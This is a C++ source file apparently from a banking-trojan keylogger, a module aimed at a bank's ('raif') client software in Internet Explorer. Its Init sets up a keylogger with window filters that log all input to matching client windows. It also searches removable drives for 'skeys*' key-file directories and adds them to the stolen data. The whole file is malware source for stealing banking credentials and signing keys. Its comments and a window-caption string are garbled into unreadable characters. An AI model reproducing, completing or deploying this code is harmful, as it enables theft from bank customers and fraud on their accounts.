#include "GetApi.h"
#include "KeyLogSystems.h"
#include "Memory.h"
#include "Utils.h"
#include "Splice.h"
#include "rafa.h"

#include "RafaDll.cpp"

namespace Rafa {

	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
		// ��������� ���������� � ����� ���������
		KeyLogger::AddDirectory(FileName, Search->cFileName);

		Cancel = true;
		*(bool*)Data = true;
	}

	void SearchRafaFiles(PCHAR Drive, LPVOID Data, bool &Cancel) {
		char D = *Drive;
		if (D == 'a' || D == 'A' || D == 'b' || D == 'B')
			return;

		bool C = false;
		SearchFiles(Drive, "skeys*", false, FA_DIRECTORY, &C, AddFiles);
		Cancel = C;
	}

	void CopyRafaKeyFiles(LPVOID Sender)
	{

#ifdef RafaDllModule
		InitHook_FilialRConDll();
#endif
		// ������� ���������� ������������� ������� rafa
		// ��������� � ����� ��������� ����� ������
		EnumDrives(DRIVE_REMOVABLE, SearchRafaFiles, NULL);

	}

	void Init()
	{
		PKeyLogSystem S;

		 S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
		if (S != NULL)
		{
			char RafaCaption[] = {
				'�', '�', '�', '�', '�', '�', '�', ' ', '�', '�', '�', '�', '�', '�', 0 };

			char RafaClass[] = {'V','C','o','n','t','r','o','l','*', 0};

			S->OnActivate   = Rafa::CopyRafaKeyFiles;
			PKlgWndFilter F = KeyLogger::AddFilter(S, true, true, RafaClass, (PCHAR)RafaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
		}
	}
}

